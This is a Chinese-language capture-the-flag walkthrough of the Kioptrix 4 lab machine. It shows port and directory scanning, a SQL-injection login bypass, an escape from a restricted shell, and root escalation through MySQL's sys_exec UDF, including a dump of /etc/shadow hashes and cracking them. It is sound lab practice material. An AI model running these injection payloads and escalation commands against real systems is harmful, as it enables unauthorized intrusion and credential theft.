# 信息搜集

1、端口扫描

```bash
└─# nmap -sV -p- -A 192.168.0.102
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9bad4ff21ec5f23914b9d3a00be84171 (DSA)
|_  2048 8540c6d541260534adf86ef2a76b4f0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:D1:CB:8D (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 10h00m00s, deviation: 2h49m42s, median: 8h00m00s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2023-06-19T07:38:46-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.0.102 (192.168.0.102)
```

2、web目录探测，发现关键目录 /john

```bash
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
```

```bash
/.html.bak            (Status: 403) [Size: 329]
/index.php            (Status: 200) [Size: 1255]
/.html                (Status: 403) [Size: 325]
/images               (Status: 301) [Size: 354] [--> http://192.168.0.102/images/]
/index                (Status: 200) [Size: 1255]
/member               (Status: 302) [Size: 220] [--> index.php]
/member.php           (Status: 302) [Size: 220] [--> index.php]
/logout               (Status: 302) [Size: 0] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/john                 (Status: 301) [Size: 352] [--> http://192.168.0.102/john/]
/robert               (Status: 301) [Size: 354] [--> http://192.168.0.102/robert/]
/.html.bak            (Status: 403) [Size: 329]
/.html                (Status: 403) [Size: 325]
```

3、80端口为登录框

<img src=".\图片\Snipaste_2023-06-19_11-55-20.png" alt="Snipaste_2023-06-19_11-55-20" style="zoom:80%;" />

# web打点

尝试了一些注入的万能密码，发现了注入点其实在登录框密码的字段，猜测用户名为 `john`

```
john:'or 1=1#
```

登录后发现重要信息， `john:MyNameIsJohn`

<img src=".\图片\Snipaste_2023-06-19_11-58-02.png" alt="Snipaste_2023-06-19_11-58-02" style="zoom:67%;" />

尝试 ssh 登录

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  john@192.168.0.102
```

发现登陆了也啥也做不了

```bash
john:~$ id
*** unknown command: id
john:~$ whoami
*** unknown command: whoami
```

```BASH
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```

绕过受限制的shell

```bash
echo os.system('/bin/bash')
```

```bash
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

# 提权

1、查看当前进程，发现mysql是以root用户运行的，尝试 udf 提权

```bash
john@Kioptrix4:~$ ps -ef | grep mysql
root      4011     1  0 07:44 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      4053  4011  0 07:44 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --s
root      4055  4011  0 07:44 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
john      4309  4288  0 08:12 pts/0    00:00:00 grep mysql
```

2、寻找网站配置文件中，mysql 的密码

```bash
john@Kioptrix4:/var/www$ cat checklogin.php 
```

发现是空密码

3、连接mysql

```bash
john@Kioptrix4:/var/www$ mysql -uroot -p
```

4、查看一些用户自定义的函数（发现udf提权其实管理员帮我们做了一半，只需要使用运行命令的函数即可）

```bahs
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              | 
| db                        | 
| func                      | 
| help_category             | 
| help_keyword              | 
| help_relation             | 
| help_topic                | 
| host                      | 
| proc                      | 
| procs_priv                | 
| tables_priv               | 
| time_zone                 | 
| time_zone_leap_second     | 
| time_zone_name            | 
| time_zone_transition      | 
| time_zone_transition_type | 
| user                      | 
+---------------------------+
17 rows in set (0.00 sec)

mysql> select * from func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)
```

## 方法一

5、运用函数执行命令，把 john 用户分配到 admin 组里去

```bash
mysql> select sys_exec('usermod -a -G admin john');
```

这里参考以下我服务器里的 sudoers 文件

```bash
root@VM-4-8-ubuntu:/home/ubuntu# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
lighthouse ALL=(ALL) NOPASSWD: ALL
ubuntu  ALL=(ALL:ALL) NOPASSWD: ALL
```

6、发现了现在 john 用户可以执行所有的 sudo 命令

```bash
john@Kioptrix4:/var/www$ sudo -l
[sudo] password for john: 
User john may run the following commands on this host:
    (ALL) ALL
```

7、提权到 root

```bash
john@Kioptrix4:~$ sudo bash
[sudo] password for john: 
root@Kioptrix4:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
john@Kioptrix4:~$ sudo su
root@Kioptrix4:/home/john# cd /root
root@Kioptrix4:~# ls
congrats.txt  lshell-0.9.12
root@Kioptrix4:~# cat congrats.txt 
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```

## 方法二

5、改变 /etc/shadow 的拥有者权限

```baash
mysql> select sys_exec('chown -R john:john /etc/shadow');
+--------------------------------------------+
| sys_exec('chown -R john:john /etc/shadow') |
+--------------------------------------------+
| NULL                                       | 
+--------------------------------------------+
1 row in set (0.00 sec)
```

6、发现改变前与改变后的不同

```bash
john@Kioptrix4:~$ ls -al /etc/shadow
-rw-r----- 1 root shadow 855 2012-02-05 00:30 /etc/shadow
john@Kioptrix4:~$ ls -al /etc/shadow
-rw-r----- 1 john john 855 2012-02-05 00:30 /etc/shadow
```

7、查看 /etc/shadow 的内容

```bash
john@Kioptrix4:~$ chmod +w /etc/shadow
john@Kioptrix4:~$ cat /etc/shadow
root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
daemon:*:15374:0:99999:7:::
bin:*:15374:0:99999:7:::
sys:*:15374:0:99999:7:::
sync:*:15374:0:99999:7:::
games:*:15374:0:99999:7:::
man:*:15374:0:99999:7:::
lp:*:15374:0:99999:7:::
mail:*:15374:0:99999:7:::
news:*:15374:0:99999:7:::
uucp:*:15374:0:99999:7:::
proxy:*:15374:0:99999:7:::
www-data:*:15374:0:99999:7:::
backup:*:15374:0:99999:7:::
list:*:15374:0:99999:7:::
irc:*:15374:0:99999:7:::
gnats:*:15374:0:99999:7:::
nobody:*:15374:0:99999:7:::
libuuid:!:15374:0:99999:7:::
dhcp:*:15374:0:99999:7:::
syslog:*:15374:0:99999:7:::
klog:*:15374:0:99999:7:::
mysql:!:15374:0:99999:7:::
sshd:*:15374:0:99999:7:::
loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
```

8、kali 本地 john 工具破解，但没成功过，最后记得把 /etc/shadow 的权限还原

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

开阔一下，可以赋予一些容易提权的命令 sudo 权限或者 suid 权限，也可以创建一些计划任务啥的

补充一下，在这里 sys_exec 函数执行反弹shell失败

也可以udf用函数修改 /etc/sudoers 文件提权
